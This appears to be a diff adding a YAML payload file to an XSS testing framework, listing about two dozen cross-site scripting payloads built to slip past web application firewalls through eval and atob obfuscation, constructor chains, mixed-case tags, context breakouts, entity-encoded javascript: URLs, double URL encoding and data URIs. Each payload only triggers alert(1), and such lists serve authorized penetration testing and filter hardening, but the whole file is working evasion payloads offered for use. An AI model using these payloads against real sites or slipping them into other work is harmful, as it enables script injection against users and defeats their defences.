@@ -1,0 +1,134 @@
+# XSS Framework — WAF Bypass Payload Set
+# Loaded only when use_waf_bypass is enabled. Uses encoding, obfuscation,
+# and uncommon syntax to evade pattern-matching WAF rules.
+category: waf_bypass
+payloads:
+  - text: '<script>eval("al"+"ert(1)")</script>'
+    tags: [waf-bypass, string-concat, eval]
+    description: Split alert string across concatenation to evade keyword matching
+    severity: high
+
+  - text: '<script>eval(atob("YWxlcnQoMSk="))</script>'
+    tags: [waf-bypass, base64, atob, eval]
+    description: Base64-encoded alert decoded at runtime
+    severity: high
+
+  - text: "<script>Function('alert(1)')()</script>"
+    tags: [waf-bypass, Function-constructor]
+    description: Function constructor to create and invoke alert
+    severity: high
+
+  - text: '<script>[].constructor.constructor("alert(1)")()</script>'
+    tags: [waf-bypass, constructor-chain]
+    description: Constructor chain to reach Function constructor
+    severity: high
+
+  - text: "<script>setTimeout('alert(1)',0)</script>"
+    tags: [waf-bypass, setTimeout, string-arg]
+    description: setTimeout with string argument evaluated as code
+    severity: high
+
+  - text: '<script>\x61\x6c\x65\x72\x74(1)</script>'
+    tags: [waf-bypass, hex-escape, js-unicode]
+    description: Alert function name encoded with JS hex escape sequences
+    severity: high
+
+  - text: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>'
+    tags: [waf-bypass, html-entity-decimal, event-handler]
+    description: Alert function call HTML-entity-encoded inside event handler
+    severity: high
+
+  - text: '<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>'
+    tags: [waf-bypass, html-entity-hex, event-handler]
+    description: Alert call encoded as hexadecimal HTML entities
+    severity: high
+
+  - text: '<ScRiPt>alert(1)</ScRiPt>'
+    tags: [waf-bypass, case-mangling, script-injection]
+    description: Mixed-case script tag to defeat case-sensitive WAF rules
+    severity: high
+
+  - text: '<IMG SRC=x ONERROR=alert(1)>'
+    tags: [waf-bypass, uppercase-attrs, img]
+    description: Uppercase attributes to evade lowercase pattern matching
+    severity: high
+
+  - text: '<SvG oNlOaD=alert(1)>'
+    tags: [waf-bypass, case-mangling, svg]
+    description: Mixed-case SVG onload
+    severity: high
+
+  - text: '</textarea><script>alert(1)</script>'
+    tags: [waf-bypass, tag-boundary, textarea-breakout]
+    description: Close textarea to escape context, then inject script
+    severity: high
+
+  - text: '</title><script>alert(1)</script>'
+    tags: [waf-bypass, tag-boundary, title-breakout]
+    description: Close title tag to escape context
+    severity: high
+
+  - text: '</style><script>alert(1)</script>'
+    tags: [waf-bypass, tag-boundary, style-breakout]
+    description: Close style block to escape context
+    severity: high
+
+  - text: '--></script><script>alert(1)</script>'
+    tags: [waf-bypass, tag-boundary, comment-breakout]
+    description: Close comment + script, inject new script
+    severity: high
+
+  - text: '<img src=x onerror=alert`1`>'
+    tags: [waf-bypass, template-literal, no-parens]
+    description: Alert called with template literal — avoids open/close parenthesis
+    severity: high
+
+  - text: '<img src=x onerror=alert/*comment*/(1)>'
+    tags: [waf-bypass, comment-inject, js-comment]
+    description: JS block comment injected between function name and call
+    severity: high
+
+  - text: '<img src="x`onerror=`alert(1)">'
+    tags: [waf-bypass, backtick-delim, unusual-syntax]
+    description: Backtick delimiter abuse in attribute value
+    severity: medium
+
+  - text: '<a href="&#106;avascript:alert(1)">X</a>'
+    tags: [waf-bypass, html-entity, javascript-url]
+    description: "Encode first char of javascript: as decimal entity"
+    severity: high
+
+  - text: '<a href="jav&#x09;ascript:alert(1)">X</a>'
+    tags: [waf-bypass, html-entity, tab-inject, javascript-url]
+    description: "Tab character (&#x09;) inside javascript: URL"
+    severity: high
+
+  - text: '<a href="jav&#x0A;ascript:alert(1)">X</a>'
+    tags: [waf-bypass, html-entity, newline-inject, javascript-url]
+    description: "Newline character (&#x0A;) inside javascript: URL"
+    severity: high
+
+  - text: '<img src=x onerror=" alert(1) ">'
+    tags: [waf-bypass, whitespace-padding]
+    description: Leading/trailing spaces in event handler value
+    severity: medium
+
+  - text: '%3Cscript%3Ealert(1)%3C/script%3E'
+    tags: [waf-bypass, url-encoded]
+    description: URL-encoded script tag (for double-decode scenarios)
+    severity: medium
+
+  - text: '%253Cscript%253Ealert(1)%253C/script%253E'
+    tags: [waf-bypass, double-url-encoded]
+    description: Double URL-encoded script tag
+    severity: medium
+
+  - text: '<iframe src="data:text/html,<script>alert(1)</script>">'
+    tags: [waf-bypass, data-uri, iframe]
+    description: Iframe with data URI containing inline script
+    severity: high
+
+  - text: '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">'
+    tags: [waf-bypass, data-uri, base64, object]
+    description: Object with base64-encoded data URI
+    severity: high
